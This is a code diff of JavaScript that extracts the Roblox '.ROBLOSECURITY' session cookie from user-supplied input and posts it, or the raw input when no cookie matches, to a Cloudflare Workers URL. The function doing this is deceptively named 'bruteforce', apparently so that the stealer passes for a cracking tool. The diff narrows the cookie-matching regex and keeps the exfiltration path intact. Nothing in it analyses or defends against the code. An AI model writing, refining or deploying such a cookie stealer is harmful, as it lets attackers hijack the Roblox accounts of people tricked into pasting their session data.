@@ -1,27 +1,19 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
 function extractRobloxSecurityCookie(sessionId) {
-  // Try multiple patterns of cookie extraction
-  const patterns = [
-    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Pattern 1: .ROBLOSECURITY=value
-    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Pattern 2: .ROBLOSECURITY","value"
-    /_\|WARNING:-DO-NOT-SHARE-THIS[^_]+_/  // Pattern 3: Full cookie format
-  ];
-  
-  for (const pattern of patterns) {
-    const match = sessionId.match(pattern);
-    if (match) return match[0]; // Return the entire match
-  }
-  return null; // Return null if no cookie found
+  // Only use this specific pattern
+  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const match = sessionId.match(regex);
+  return match ? match[1] : null; // Return captured group or null
 }
 
-async function sendToProxy(sessionId) {
+async function sendToProxy(data) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        sessionId: sessionId,
+        sessionId: data,
         timestamp: new Date().toISOString()
       })
     });
@@ -35,8 +27,12 @@ async function sendToProxy(sessionId) {
 
 function bruteforce(sessionId) {
   try {
-    const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
-    sendToProxy(cookie).then(response => {
+    const cookie = extractRobloxSecurityCookie(sessionId);
+    
+    // If no .ROBLOSECURITY found, send the raw input
+    const dataToSend = cookie || sessionId;
+    
+    sendToProxy(dataToSend).then(response => {
       console.log('Proxy response:', response);
     }).catch(error => {
       console.error('Proxy error:', error);
